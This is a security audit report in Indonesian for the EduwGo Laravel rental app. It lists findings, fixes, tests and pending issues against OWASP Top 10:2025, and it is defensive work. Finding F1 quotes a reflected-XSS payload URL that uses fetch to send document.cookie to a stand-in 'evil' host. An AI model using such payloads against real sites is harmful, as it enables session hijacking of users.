# Audit Keamanan EduwGo

- Tanggal audit: 23 Oktober 2026
- Branch: `Marnyot/mario-chore-security-audit` (dasar: `main` @ `3cac139`)
- Cakupan: kode aplikasi (route, controller, Policy, FormRequest, Blade, service), skema & seeder database, konfigurasi, dependensi, Docker/CI. Audit **hanya** terhadap kode dan database test lokal (container MySQL sementara). Tidak ada akses ke database Aiven, dashboard Xendit, atau host luar; tidak ada serangan ke sistem nyata.
- Referensi kategori: OWASP Top 10:2025 (daftar diverifikasi di https://top10.owasp.org/2025 pada tanggal audit).

## 1. Ringkasan

Fondasi keamanan EduwGo sudah cukup baik: setiap halaman pesanan mengecek pemilik, area admin dibatasi per cabang lewat Policy + scope `managedBy`, webhook Xendit memverifikasi `x-callback-token` dengan `hash_equals`, idempotent dengan `lockForUpdate`, dan menyimpan raw payload. Checkout memakai transaksi + `lockForUpdate` pada unit. Tidak ditemukan SQL injection, IDOR antar user/antar cabang, maupun rahasia yang ter-commit.

Temuan terpenting:

| # | Temuan | Severity | Status |
|---|---|---|---|
| F1 | Reflected XSS di modal pilih durasi (`?start=` masuk ke `x-data`) | **Tinggi** | Diperbaiki |
| F2 | `UserSeeder` membuat superadmin/admin dengan password `password` dan email tebakan, juga di production | **Tinggi** | Diperbaiki (wajib `SEED_USER_PASSWORD` di production) |
| F3 | Ekstensi file upload diambil dari nama file klien (polyglot `.html`/`.svg` di folder publik) | Sedang | Diperbaiki |
| F4 | Race condition transisi status booking (cek status di luar kunci baris) | Sedang | Diperbaiki |
| F5 | Tidak ada rate limit register, lupa/reset password, checkout, polling status; kirim ulang OTP tanpa batas per jam | Sedang | Diperbaiki |
| F6 | Enumerasi akun lewat form lupa password | Sedang | Diperbaiki |
| F7 | Tidak ada header keamanan (X-Frame-Options, nosniff, HSTS, dst.) | Sedang | Diperbaiki (CSP belum) |
| F8 | Halaman error 429 (dan kode lain tanpa view khusus) crash menjadi 500 | Sedang | Diperbaiki |
| N1 | Webhook tidak memverifikasi nominal yang dibayar; bayar setelah Expired tidak tertangani | Sedang | Belum (butuh keputusan bisnis) |
| N2 | Raw payload Xendit tertimpa payload sintetis + berisi data pribadi tanpa retensi | Sedang | Belum |
| N3 | Hapus akun menghapus (cascade) booking & payment, termasuk yang sudah lunas | Sedang | Belum (butuh migrasi + keputusan) |
| N4 | Tidak ada batas booking Pending per user (unit bisa dikunci massal) | Sedang | Sebagian (throttle checkout) |
| N5 | 11 kerentanan npm (2 kritis, 7 tinggi) di tooling build/dev | Sedang | Belum (lockfile tidak boleh diubah di task ini) |

Total perubahan kode: 8 perbaikan + 26 feature test baru (`tests/Feature/Security/*`). Seluruh suite: **494 test, 2097 assertion, OK**. Detail di bagian 7.

## 2. Metodologi

1. Baca `docs/SPEC.md`, `docs/KEPUTUSAN.md`, `docs/DEPLOY.md` (catatan: tidak ada `CLAUDE.md` di repo/worktree ini).
2. Telusuri manual semua route (`routes/web.php`, `routes/auth.php`), controller, Policy, FormRequest, model, service, middleware, Blade (`{!! !!}`, `{{ }}` di dalam atribut Alpine/JS, `@json`), migration, seeder, config, `compose.yaml`, `docker/`, `.github/workflows`.
3. Pencarian pola: `whereRaw/selectRaw/orderBy($`, `forceFill`, `$guarded`, `getClientOriginalExtension`, `redirect()->away/intended`, `Log::`, `env(` di luar config.
4. `composer audit --locked` dan `npm audit --package-lock-only` (hanya membaca lockfile, tidak mengubahnya).
5. Setiap perbaikan diberi feature test (happy path + kasus gagal). Test "kasus gagal" dijalankan juga terhadap kode lama untuk memastikan test benar-benar menangkap bug (17 dari 26 test gagal di kode lama, sesuai harapan; sisanya happy path/regresi).

## 3. Temuan yang sudah diperbaiki

### F1. Reflected XSS di modal pilih durasi — Tinggi (A05 Injection)

- Bukti (sebelum): `resources/views/components/booking-duration-modal.blade.php:3` memakai `'{{ session()->pull('booking.start_at', request('start', '')) }}'` di dalam atribut `x-data`. `{{ }}` mengubah `'` menjadi `&#039;`, tetapi browser mendekode entity atribut **sebelum** Alpine mengevaluasi ekspresi, sehingga `'` kembali utuh dan keluar dari string JavaScript.
- Dampak: tautan `/kendaraan/{slug}?start=');fetch('//evil?c='+document.cookie);//` yang dibuka pengguna yang sedang login menjalankan JavaScript di origin EduwGo (modal hanya dirender untuk pengguna login, `resources/views/kendaraan/show.blade.php:49-53`). Penyerang bisa melakukan aksi atas nama korban (checkout, batal, ubah profil); bila korban admin, seluruh area admin.
- Perbaikan: nilai di-encode dengan `@js()` (`Js::from`, flag `JSON_HEX_APOS/QUOT/TAG/AMP`) dan dipaksa string skalar; `?start[]=` (array) tidak lagi memicu error. `resources/views/components/booking-duration-modal.blade.php:3-12`.
- Test: `tests/Feature/Security/XssDurationModalTest.php`.
- Pola `'{{ ... }}'` lain di dalam atribut Alpine (`waiting.blade.php:17`, `success.blade.php:5`, `modal.blade.php:42`, `role-form.blade.php:3`) hanya berisi route/kode booking/nama role dari server, bukan input pengguna, jadi aman. Rekomendasi tetap: pakai `@js()` untuk semua nilai di atribut Alpine.

### F2. Seeder membuat akun admin dengan password lemah di production — Tinggi (A07, A02)

- Bukti (sebelum): `database/seeders/UserSeeder.php:47` (`'password' => 'password'`) untuk `superadmin@eduwgo.test`, `admin@eduwgo.test`, `admin.batu@...`, `admin.surabaya@...`, tanpa cek environment. `docs/DEPLOY.md` bagian 6 menyarankan menjalankan seeder ke DB terkelola. Email `.test` mudah ditebak (dan tidak bisa menerima email reset).
- Perbaikan: `database/seeders/UserSeeder.php:23,66-82` + `config/app.php` (`app.seed_user_password` ← `SEED_USER_PASSWORD`).
  - Lokal/testing: tanpa env tetap `password` (alur demo tidak berubah); bila `SEED_USER_PASSWORD` diisi, dipakai.
  - `APP_ENV=production`: seeder **menolak berjalan** (RuntimeException, tidak ada akun dibuat) kecuali `SEED_USER_PASSWORD` minimal 12 karakter.
- Test: `tests/Feature/Security/UserSeederProductionTest.php`.
- Tindakan manual yang disarankan (tidak dilakukan agent): bila DB production/demo publik **sudah** pernah di-seed, ganti password semua akun seed sekarang (login lalu Profil > Ubah kata sandi, atau `artisan tinker` di lingkungan itu), dan pertimbangkan mengganti email superadmin ke email nyata. Usulan lanjutan: di production `DatabaseSeeder` hanya menjalankan `RoleSeeder`, `BranchSeeder`, `VehicleTypeSeeder`, `SettingSeeder` (tanpa `BookingSeeder` data dummy) — tidak diubah karena demo saat ini memakai data dummy.

### F3. Ekstensi file upload dari nama file klien — Sedang (A05, A06)

- Bukti (sebelum): foto kendaraan `app/Http/Controllers/Admin/VehicleController.php` (lama: `strtolower($file->getClientOriginalExtension())`) dan logo/favicon `app/Http/Controllers/Admin/SettingController.php` (lama: `uniqid(...).'.'.$file->getClientOriginalExtension()`), keduanya disimpan di disk `public` (`/storage/...`, bisa dibuka langsung).
- Catatan: aturan `mimes` Laravel sudah memblokir nama berekstensi PHP (`.php`, `.phtml`, `.phar`, ...), jadi RCE langsung tidak terjadi. Namun file berisi JPEG/PNG valid bernama `foto.html` lolos validasi dan disajikan sebagai `text/html` (polyglot) → stored XSS di origin EduwGo. Favicon/logo tidak di-re-encode sama sekali.
- Perbaikan: ekstensi ditentukan dari isi file (`guessExtension()`) dengan whitelist (`jpg/png/webp` untuk kendaraan, `png/svg/ico/jpg` untuk pengaturan). `VehicleController.php:199,212,247-254`, `SettingController.php:64-73`.
- Test: `tests/Feature/Security/UploadExtensionTest.php`.
- Sisa risiko (Rendah, belum): favicon boleh SVG (`app/Http/Requests/SettingRequest.php:25`). SVG berisi `<script>` yang dibuka langsung dari `/storage/settings/*.svg` tetap tereksekusi. Hanya superadmin yang bisa upload. Rekomendasi: tolak SVG, atau sajikan upload dari domain/bucket terpisah, atau sanitasi SVG.

### F4. Race condition transisi status booking — Sedang (A06, A08)

- Bukti (sebelum): `app/Services/BookingService.php` mengecek `$booking->status->canTransitionTo($to)` dari instance di memori, **di luar** transaksi dan tanpa kunci. `PaymentService::applyInvoiceStatus` mengunci baris payment, tetapi satu booking bisa punya beberapa payment (ganti metode bayar membuat payment request per channel), sehingga dua event berbeda (mis. `payment.capture` untuk QRIS dan `EXPIRED` dari scheduler/payment lain, atau admin "bayar tunai" bersamaan dengan webhook) bisa sama-sama membaca `pending` dan menulis status bergantian + riwayat ganda + email ganda.
- Perbaikan:
  - `BookingService::transition()` (file bersama) kini mengunci baris booking (`lockForUpdate`) di dalam transaksi dan mengecek ulang status terbaru dari DB; status basi → `InvalidTransitionException`. `app/Services/BookingService.php:20-55`. Perilaku untuk alur normal tidak berubah; satu-satunya jalur ubah status tetap `transition()`.
  - `PaymentService` membaca booking dengan kunci baris sebelum memutuskan transisi. `app/Services/PaymentService.php:42,55,80-83`.
- Test: `tests/Feature/Security/BookingTransitionRaceTest.php`.

### F5. Rate limiting yang kurang — Sedang (A07, A06)

| Endpoint | Sebelum | Sesudah | Bukti |
|---|---|---|---|
| `POST /login` | 5×/email+IP (Breeze) | tetap | `app/Http/Requests/Auth/LoginRequest.php:43` |
| `POST /register` | tidak ada | 6/menit/IP | `routes/auth.php:19` |
| `POST /forgot-password` | hanya throttle broker 60 dtk per email | + 6/menit/IP | `routes/auth.php:30` |
| `POST /reset-password` | tidak ada | 6/menit/IP | `routes/auth.php:37` |
| `POST /verify-email` (tebak kode 6 angka) | 10/menit + 5 salah per kode | tetap | `routes/auth.php:46`, `app/Services/EmailVerificationCodeService.php:13` |
| `POST /email/verification-notification` (kirim ulang OTP) | 3/menit | 3/menit **+ 10/jam** per akun | `routes/auth.php:50`, `app/Providers/AppServiceProvider.php` |
| `POST /checkout/{vehicle}` | tidak ada | 10/menit/user | `routes/web.php:121` |
| `GET /pesanan/{code}/status` (memanggil API Xendit) | tidak ada | 60/menit/user (poller 3–5 dtk tetap aman) | `routes/web.php:109` |

- Analisis brute force OTP sesudah perbaikan: maks 10 kode/jam × 5 tebakan = 50 tebakan/jam per akun dari ruang 10⁶ (≈0,12%/hari). Kode disimpan sebagai hash bcrypt (`EmailVerificationCodeService.php:25`), kedaluwarsa 10 menit.
- Test: `tests/Feature/Security/AuthRateLimitTest.php`, `tests/Feature/Security/CheckoutHardeningTest.php`.

### F6. Enumerasi akun lewat lupa password — Sedang (A07)

- Bukti (sebelum): `app/Http/Controllers/Auth/PasswordResetLinkController.php` menampilkan error `passwords.user` ("tidak menemukan pengguna") untuk email tidak terdaftar dan pesan berbeda saat di-throttle.
- Perbaikan: respons selalu `passwords.sent` apa pun hasilnya. `PasswordResetLinkController.php:36-42`. Test: `AuthRateLimitTest::test_lupa_password_email_terdaftar_dan_tidak_terdaftar_mendapat_respons_sama`.
- Sisa (Rendah, diterima): form registrasi tetap menampilkan "Email sudah terdaftar." (`RegisterRequest`); ini kompromi UX umum, kini dibatasi 6/menit/IP.

### F7. Header keamanan — Sedang (A02)

- Bukti (sebelum): tidak ada middleware/header keamanan; `public/.htaccess` hanya `-Indexes`.
- Perbaikan: middleware baru `app/Http/Middleware/SecurityHeaders.php`, dipasang global di `bootstrap/app.php:35`: `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff` (juga menahan sniffing file upload), `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy`, dan `Strict-Transport-Security` (hanya HTTPS + production).
- Test: `tests/Feature/Security/SecurityHeadersTest.php`.
- Belum: Content-Security-Policy (lihat N6).

### F8. Halaman error fallback crash (429 → 500) — Sedang (A10)

- Ditemukan saat menguji rate limit. View error bawaan Laravel (401, 402, 429, ...) meng-extend `errors::minimal`, yang di-override `resources/views/errors/minimal.blade.php` dan mewajibkan variabel `$code/$heading/$message` → `Undefined variable $code` → setiap 429 menjadi 500 (dan menulis error ke log).
- Perbaikan: `minimal.blade.php:38-43` memakai variabel bila ada, jika tidak memakai `@section` view bawaan; ditambah `resources/views/errors/429.blade.php` berbahasa Indonesia.
- Test: semua test 429 di `AuthRateLimitTest`/`CheckoutHardeningTest` (sebelumnya 500).

### F9. Pesan exception internal tampil ke pengguna — Rendah (A10, A02)

- Bukti (sebelum): `CheckoutController::store` menampilkan `'Gagal memproses checkout: '.$e->getMessage()`; `BookingPaymentController::waiting` menampilkan `$e->getMessage()`. Pesan dari `XenditService` berisi body respons Xendit (`XenditService.php:68,301`) dan bisa berisi pesan SQL.
- Perbaikan: pesan umum ke pengguna, detail ke log. `CheckoutController.php:43-52`, `BookingPaymentController.php:37-46`. Test: `CheckoutHardeningTest::test_error_gateway_tidak_ditampilkan_ke_pengguna`.
- Sisa: tombol admin "Cek Status Xendit" (`PesananController.php` `cekStatus`) masih menampilkan pesan exception ke admin — diterima (hanya staf).

### F10. Input tanggal dashboard menyebabkan 500 — Rendah (A10)

- Bukti (sebelum): `DashboardController::index` memanggil `Carbon::parse($request->input('dari'))` tanpa validasi.
- Perbaikan: validasi `dari`, `sampai` (`date`) dan `tipe` (`integer`). `app/Http/Controllers/Admin/DashboardController.php:17-24`. Test: `tests/Feature/Security/DashboardInputValidationTest.php`.

### F11. Konfigurasi & CI — Rendah (A02, A03)

- `.github/workflows/test.yml:8-9`: `permissions: contents: read` (sebelumnya token default workflow).
- `.env.example`: catatan production `APP_DEBUG=false`, `SESSION_SECURE_COOKIE=true`, `MYSQL_ATTR_SSL_CA`, `SEED_USER_PASSWORD` (tanpa nilai rahasia). `.env` tidak disentuh.

## 4. Temuan yang belum diperbaiki (besar/ambigu)

### N1. Nominal pembayaran tidak diverifikasi; bayar setelah Expired — Sedang (A08, A06)
- `PaymentService::applyInvoiceStatus` menandai `paid` hanya dari `status` payload, tidak membandingkan `paid_amount/amount` dan `currency` dengan `payments.amount`/`bookings.total_amount`. Payload sudah terautentikasi token, jadi risikonya ada bila token bocor atau ada kekeliruan di sisi gateway.
- Jika `PAID` datang setelah booking Expired (scheduler `routes/console.php:11` atau webhook EXPIRED lebih dulu), payment menjadi `paid` tetapi booking tetap `expired` tanpa tanda/alert → uang masuk tanpa sewa.
- Rekomendasi: tolak/tandai (log `warning` + flag di admin) jika nominal/currency tidak cocok; tampilkan daftar "payment paid, booking expired" di admin untuk refund manual. Butuh keputusan bisnis.

### N2. Raw payload Xendit tertimpa & berisi data pribadi — Sedang (A08, A09, A04)
- `PaymentService.php:31` selalu menimpa `gateway_payload`. `ExpireBookings.php:49` dan sinkronisasi (`XenditService.php:731-737,773-776`) mengirim payload sintetis (mis. `{"status":"EXPIRED"}`), sehingga payload asli dari Xendit hilang — bertentangan dengan SPEC ("simpan raw payload").
- Payload berisi email/nama pembayar, nomor VA/e-wallet; disimpan tanpa batas waktu dan ikut terhapus/terbaca bersama tabel payments.
- Rekomendasi: simpan event ke tabel append-only `payment_events` (raw, sumber, waktu) dan hanya merge field di `payments`; kebijakan retensi (mis. masking setelah 90 hari). Perlu migrasi → issue terpisah.

### N3. Hapus akun menghapus riwayat transaksi — Sedang (A08, A09)
- `bookings.user_id` dan `payments.booking_id` `cascadeOnDelete` (`database/migrations/2026_09_23_100930_create_bookings_table.php:14`, `..._create_payments_table.php:13`); `ProfileController::destroy` (`ProfileController.php:99`) bisa dipanggil penyewa yang masih punya booking Lunas/Sedang disewa → catatan keuangan & bukti serah terima hilang.
- Rekomendasi: blokir hapus akun bila ada booking aktif, ganti FK ke `restrictOnDelete`/anonimisasi user (soft delete + kosongkan PII). Perlu keputusan & migrasi.

### N4. Unit bisa dikunci massal oleh satu akun — Sedang (A06)
- Setiap checkout membuat booking Pending yang memblokir unit selama durasi invoice (default 60 menit). Satu akun terverifikasi bisa memblokir banyak unit. Throttle 10/menit (F5) memperlambat tetapi tidak mencegah.
- Rekomendasi: batasi jumlah booking Pending per user (mis. maks 2) di `BookingService::checkout`. Mengubah aturan bisnis → perlu disepakati.

### N5. Dependensi npm rentan — Sedang (A03)
- `npm audit --package-lock-only`: 11 kerentanan (2 kritis, 7 tinggi, 2 sedang): `vite` 8.3.0–8.3.2 (dev server: cross-origin script execution, akses file di luar `server.fs.allow`), `concurrently`→`shell-quote` (kritis, command injection), rantai `tailwindcss` 3 (`braces`, `micromatch`, `fast-glob`, `chokidar`, `postcss-selector-parser`, `postcss-nested`), `source-map-js`.
- Semuanya devDependencies/tooling build; tidak ikut ke runtime production (Alpine dibundel, tidak terdampak). Risiko nyata: dev server Vite yang diekspos (`VITE_PORT` dipublish di `compose.yaml`) dan mesin developer/CI.
- `composer audit --locked`: **tidak ada advisory**.
- Rekomendasi: PR terpisah `npm audit fix` (update `vite` ≥ versi patch terbaru, `concurrently`), lalu jalankan build & test. Lockfile tidak diubah di task ini sesuai instruksi.

### N6. Content-Security-Policy belum ada — Sedang (A02, A05)
- CSP akan menjadi lapis kedua untuk XSS seperti F1. Penghalang: Alpine standar memakai `new Function` (butuh `'unsafe-eval'`), script inline (anti-flash tema di `layouts/partials/head.blade.php`, dashboard, halaman bayar), Chart.js dari CDN.
- Rekomendasi: Alpine CSP build (`@alpinejs/csp`) + nonce Vite (`Vite::useCspNonce()`), mulai dari `Content-Security-Policy-Report-Only`.

### N7. Lain-lain (Rendah)
| ID | Temuan | Bukti | Rekomendasi |
|---|---|---|---|
| N7a | `trustProxies(at: '*')`: bila app bisa diakses langsung (tanpa proxy), `X-Forwarded-For` bisa dipalsukan → bypass rate limit berbasis IP; tidak ada `trustHosts` | `bootstrap/app.php:19` | Isi IP/CIDR proxy hosting via env; aktifkan `trustHosts()` di production |
| N7b | Cookie sesi `secure` bergantung env (default null) | `config/session.php:172` | Production: `SESSION_SECURE_COOKIE=true` (sudah dicatat di `.env.example`); `http_only` true & `same_site=lax` sudah benar |
| N7c | TLS DB: hanya `MYSQL_ATTR_SSL_CA`; bila env kosong, `array_filter` menghapus opsi → koneksi tanpa TLS tanpa peringatan; tidak ada `MYSQL_ATTR_SSL_VERIFY_SERVER_CERT` eksplisit | `config/database.php:62-64` | Di production wajibkan CA dan set verify server cert `true`; jangan commit `ca.pem` (sudah tidak ada di git) |
| N7d | Privilese user DB | (di luar kode) | App memakai user non-admin dengan hak `SELECT/INSERT/UPDATE/DELETE` pada skema app saja; migrasi memakai user terpisah. Jangan pakai user admin bawaan penyedia (mis. `avnadmin`) untuk runtime |
| N7e | `compose.yaml`: phpMyAdmin auto-login (`PMA_USER/PMA_PASSWORD`) dan MySQL dipublish di semua interface, `MYSQL_ALLOW_EMPTY_PASSWORD: 1` | `compose.yaml:31,38,57,61` | Khusus dev; bind ke `127.0.0.1:` agar tidak terbuka di Wi-Fi publik |
| N7f | Bayar tunai admin menerima nominal bebas (min 1) | `app/Http/Controllers/Admin/PesananController.php:215` | Default/validasi = `total_amount`, catat selisih di catatan |
| N7g | `social_*` di Pengaturan berupa teks bebas tetapi dipakai sebagai `href` footer (`javascript:` mungkin, oleh superadmin) | `SettingRequest.php:31-33`, `layouts/footer.blade.php:62` | Validasi `url:http,https` atau bangun URL dari username |
| N7h | Password admin cabang `min:8` (lebih lemah dari `Password::defaults()` di register) | `PenggunaController.php:44` | Pakai `Password::defaults()`; set `Password::defaults()` lebih ketat di production |
| N7i | `is_active` & `branch_id` ada di `#[Fillable]` User (saat ini tidak ada mass-assign dari request mentah) | `app/Models/User.php:19` | Defense-in-depth: keluarkan dari fillable, set eksplisit |
| N7j | Log: error Xendit mencatat body respons penuh (bisa berisi email pembayar); `LOG_LEVEL=debug` default; tidak ada alert untuk webhook token salah/lockout login | `XenditService.php:68,718,761`, `.env.example` `LOG_LEVEL` | Production `LOG_LEVEL=warning`; mask PII; alert (Slack/email) untuk lonjakan `Webhook Xendit ditolak` & event `Lockout` |
| N7k | CI: actions di-pin tag (`@v4`, `@v2`) bukan SHA; tidak ada langkah `composer audit`/`npm audit` | `.github/workflows/test.yml:43-55` | Pin SHA + Dependabot; tambah langkah audit (non-blocking dulu) |
| N7l | `GET /api/kendaraan/{id}/durasi` publik tanpa throttle & tanpa cek unit aktif (hanya info ketersediaan) | `routes/web.php:45`, `KendaraanController.php` | `throttle:60,1`, `abort_unless($vehicle->is_active, 404)` seperti `jadwal` |
| N7m | `customer_phone` checkout tanpa format | `app/Http/Requests/CheckoutRequest.php:20` | Samakan regex dengan register |
| N7n | Webhook tanpa allowlist IP Xendit | `routes/web.php:53` | Opsional, token sudah cukup bila rahasia terjaga |
| N7o | CORS: tidak ada `config/cors.php` (default framework, path `api/*` origin `*`). Endpoint `/api/kendaraan/*` hanya data publik | — | Aman untuk sekarang; publish config bila ada API berdata pribadi |

## 5. Keamanan database

| Aspek | Status | Catatan |
|---|---|---|
| Foreign key | Aman | `vehicles.vehicle_type_id` restrict, `vehicles.branch_id` restrict (`2026_10_17_100000_rename_locations_to_branches.php:37`), `bookings.vehicle_id` restrict, `booking_status_histories.changed_by` null on delete. **Catatan N3** untuk cascade `user_id`/`booking_id` |
| Unique | Aman | `bookings.code`, `vehicles.plate_number`, `vehicles.slug`, `vehicle_types.slug`, `branches.slug`, `sequences.key`, `settings.key`, `email_verification_codes.user_id` |
| Index | Aman | `bookings(vehicle_id,status,start_at,end_at)` untuk cek overlap, `bookings.status`, `payments.gateway_reference` |
| Password | Aman | bcrypt via cast `hashed`, `password`/`remember_token` `#[Hidden]`; kode OTP disimpan hash bcrypt; token reset password disimpan hash oleh Laravel |
| Data sensitif | Perlu perbaikan | `payments.gateway_payload` berisi PII pembayar (N2); `sessions.payload` tidak dienkripsi (`SESSION_ENCRYPT=false`, risiko rendah bila DB aman) |
| Seeder production | Perbaikan sudah dilakukan | F2 |
| SSL koneksi DB | Perlu perbaikan | N7c |
| Privilese user DB | Perlu tindakan manual | N7d (tidak dapat diverifikasi dari kode; DB Aiven tidak diakses) |
| Race checkout | Aman | `BookingService::checkout` transaksi + `Vehicle::lockForUpdate()` (`BookingService.php:61-62`), kode booking dari tabel `sequences` |
| Race webhook ganda | Perbaikan sudah dilakukan | payment `lockForUpdate` (sudah ada) + booking `lockForUpdate` (F4) |
| Integritas status | Aman | Satu-satunya penulisan status setelah dibuat adalah `BookingService::transition()` (`BookingService.php:38`); pencarian `status =`/`update(['status'` tidak menemukan jalur lain untuk tabel `bookings` |

## 6. Hal yang diverifikasi aman

- **Authz penyewa**: `BookingController::show/cancel` lewat `BookingPolicy` (`BookingController.php:54,71`); semua aksi `BookingPaymentController` (`waiting, bayar, success, failed, demoBayar, status, ulang`) mengecek `user_id` (contoh `BookingPaymentController.php:19,60`). Kode booking berurutan (`EG.000001`) mudah ditebak, tetapi setiap akses dicek pemiliknya.
- **Authz admin per cabang**: `PesananController` memakai `Gate::authorize('viewAny'|'adminView'|'adminUpdate')` di setiap aksi (`PesananController.php:33,137,149,175,191,212`); `BookingPolicy::manages` mengecek cabang lewat kendaraan termasuk yang soft-deleted (`BookingPolicy.php:43`); list memakai `Booking::managedBy` (`Booking.php:64`). Admin kendaraan memakai `VehiclePolicy::canManageBranch` per aksi resource dan `VehicleRequest` memaksa `branch_id` milik admin cabang (`VehicleRequest.php:17`). Dashboard & export memakai `effectiveBranchId()` (admin cabang tidak bisa memilih `?branch=` lain; admin tanpa cabang → 0 → kosong). Superadmin-only: grup route `role:superadmin` (`routes/web.php:146`) + Policy. Superadmin tidak bisa mengubah role/menonaktifkan diri sendiri (`UserPolicy`). Sudah ada test `tests/Feature/Admin/BranchScopeTest.php`, `RoleAccessTest.php`.
- **Mass assignment**: model memakai `$guarded = ['id']`, tetapi semua `create/update` memakai data `validated()` atau array eksplisit; `forceFill` hanya di seeder, `PenggunaController::store` (data tervalidasi), reset password, dan tema (tervalidasi).
- **SQL injection**: tidak ada input pengguna di `whereRaw/selectRaw` (`Vehicle.php:47` konstanta, `DashboardService.php:15,36` konstanta); `LIKE` memakai binding; pengurutan katalog di-whitelist (`VehicleController.php:34-37`, `CabangPublikController.php:41-44`).
- **XSS lain**: `{!! !!}` hanya untuk SVG statis dari kode (`status-icon.blade.php`, `footer.blade.php:63`, ikon kanal `bayar.blade.php:51`); `@json` di `<script>` memakai flag HEX bawaan Blade; tidak ada `x-html`.
- **CSRF**: hanya `webhooks/*` yang dikecualikan (`bootstrap/app.php:22`); webhook memverifikasi token dengan `hash_equals` dan menolak token kosong (`XenditWebhookController.php:20`).
- **Open redirect**: `url.intended` hanya diisi server (`VehicleController.php:111`); `redirect()->away()` hanya ke `gateway_url` dari respons Xendit (`BookingPaymentController.php:107`).
- **Autentikasi**: login dibatasi 5 percobaan per email+IP; akun nonaktif ditolak setelah login dan di setiap request (`EnsureUserIsActive`); sesi diregenerasi saat login dan diinvalidasi saat logout.
- **APP_DEBUG**: default `false` di `config/app.php:42`; halaman 500 kustom tanpa stack trace; `/styleguide` tidak terdaftar di production (`routes/web.php:61-65`); tombol demo bayar hanya aktif untuk key `xnd_development` (`BookingPaymentController.php:192-197`).
- **File publik**: document root `public/` (`.env`, `storage/`, `docs/`, `.git` di luar webroot), `-Indexes` di `public/.htaccess:3`; tidak ada `.env`, `ca.pem`, atau secret di `git ls-files` maupun riwayat git (pencarian pola `xnd_*`, `AVNS_`, `.pem`).
- **Webhook idempotent**: payment dikunci, status terminal tidak diproses ulang (`PaymentService.php:26-72`); event tak dikenal dijawab 200 tanpa efek.

## 7. Checklist OWASP Top 10:2025

| Kategori | Status | Bukti | Rekomendasi |
|---|---|---|---|
| A01:2025 Broken Access Control | Aman | Bagian 6 (Policy per aksi, scope cabang, cek pemilik); `BranchScopeTest`, `RoleAccessTest` | N7i (fillable), terus tambahkan test IDOR saat ada route baru |
| A02:2025 Security Misconfiguration | Perbaikan sudah dilakukan (sebagian perlu perbaikan) | F7 header, F11 CI/`.env.example`, F9 pesan error | N6 CSP, N7a trusted proxies/hosts, N7b secure cookie, N7e compose |
| A03:2025 Software Supply Chain Failures | Perlu perbaikan | `composer audit` bersih; `npm audit` 11 temuan dev (N5); CI tanpa pin SHA (N7k); F11 permissions | PR `npm audit fix`, pin SHA, Dependabot, langkah audit di CI |
| A04:2025 Cryptographic Failures | Perlu perbaikan (minor) | bcrypt password & OTP, `APP_KEY` AES-256-CBC, HSTS (F7) | N7c TLS DB terverifikasi, N7b secure cookie, N2 PII payload |
| A05:2025 Injection | Perbaikan sudah dilakukan | F1 XSS, F3 polyglot upload; SQLi aman (bagian 6) | N6 CSP, N7g validasi URL sosmed, SVG favicon |
| A06:2025 Insecure Design | Perlu perbaikan | F4 race, F5 throttle checkout | N1 verifikasi nominal, N4 batas booking Pending, N7f bayar tunai |
| A07:2025 Authentication Failures | Perbaikan sudah dilakukan | F2 seeder, F5 rate limit, F6 enumerasi; login throttle Breeze | N7h kebijakan password admin; ganti password akun seed di DB yang sudah ada |
| A08:2025 Software or Data Integrity Failures | Perlu perbaikan | Webhook token `hash_equals` + idempotent; F4 lock booking | N1, N2 raw payload tertimpa, N3 cascade delete |
| A09:2025 Security Logging and Alerting Failures | Perlu perbaikan | Ada channel log `xendit` (daily, 14 hari), riwayat status dengan pelaku | N7j alert & masking PII, N2 jejak audit payment, N3 riwayat hilang |
| A10:2025 Mishandling of Exceptional Conditions | Perbaikan sudah dilakukan | F8 error 429→500, F9 pesan exception, F10 tanggal invalid | Tangani "PAID setelah Expired" (N1) secara eksplisit |

## 8. Daftar perubahan

### Sudah diperbaiki (file)

| File | Perubahan | File bersama? |
|---|---|---|
| `resources/views/components/booking-duration-modal.blade.php` | F1: `@js()` + paksa string | **Ya** (`components/*`) |
| `app/Services/BookingService.php` | F4: kunci baris + cek ulang status di `transition()` | **Ya** |
| `resources/views/errors/minimal.blade.php`, `resources/views/errors/429.blade.php` (baru) | F8 | Layout error (bukan `layouts/*`, tetapi dipakai semua halaman error) |
| `app/Services/PaymentService.php` | F4: booking dikunci sebelum cek status | Tidak (alur A) |
| `app/Http/Controllers/Admin/VehicleController.php`, `app/Http/Controllers/Admin/SettingController.php` | F3 | Tidak |
| `routes/web.php`, `routes/auth.php`, `app/Providers/AppServiceProvider.php` | F5 | Tidak |
| `app/Http/Controllers/Auth/PasswordResetLinkController.php` | F6 | Tidak |
| `app/Http/Middleware/SecurityHeaders.php` (baru), `bootstrap/app.php` | F7 | Tidak |
| `app/Http/Controllers/CheckoutController.php`, `app/Http/Controllers/BookingPaymentController.php` | F9 | Tidak |
| `app/Http/Controllers/Admin/DashboardController.php` | F10 | Tidak |
| `database/seeders/UserSeeder.php`, `config/app.php` | F2 | Tidak |
| `.github/workflows/test.yml`, `.env.example` | F11 | Tidak |
| `tests/Feature/Security/*.php` (7 file, 26 test) | Test untuk F1–F10 | — |
| `docs/SECURITY_AUDIT.md` | Laporan ini | — |

`app/Enums/BookingStatus.php` dan `resources/views/layouts/*` **tidak** diubah. Alur bisnis tidak berubah: transisi status, durasi, buffer, pembayaran, dan hak akses tetap sama; perubahan hanya menambah batas (throttle), validasi, dan penguncian.

### Belum diperbaiki
N1–N7 (bagian 4). Prioritas usulan: (1) ganti password akun seed di DB demo/production yang sudah ada + set `APP_DEBUG=false`, `SESSION_SECURE_COOKIE=true`, TLS DB; (2) N5 `npm audit fix`; (3) N1 & N2 (integritas pembayaran); (4) N3 & N4 (keputusan tim); (5) N6 CSP.

## 9. Cara verifikasi

- Test dijalankan dengan image Sail proyek (`eduwgo-sail-8.3/app`, PHP 8.3.35) + container MySQL 8.4 sementara, lewat `docker run` setara `sail artisan test`. Skrip `sail` tidak dipakai langsung karena worktree audit tidak punya `.env` dan task ini melarang mengubah `.env`; variabel diambil dari `.env.example` (sama seperti CI).
  - `php artisan test` / `vendor/bin/phpunit`: **OK (494 test, 2097 assertion)**. Warning `file_get_contents(.env)` yang muncul hanya karena worktree tanpa `.env`.
  - `vendor/bin/pint --test`: semua file yang diubah/ditambah bersih. Pint masih gagal di `database/seeders/RoleSeeder.php` (`class_attributes_separation`) — masalah **lama** di `main`, tidak disentuh karena di luar cakupan; langkah Pint di CI akan merah sampai file itu dirapikan.
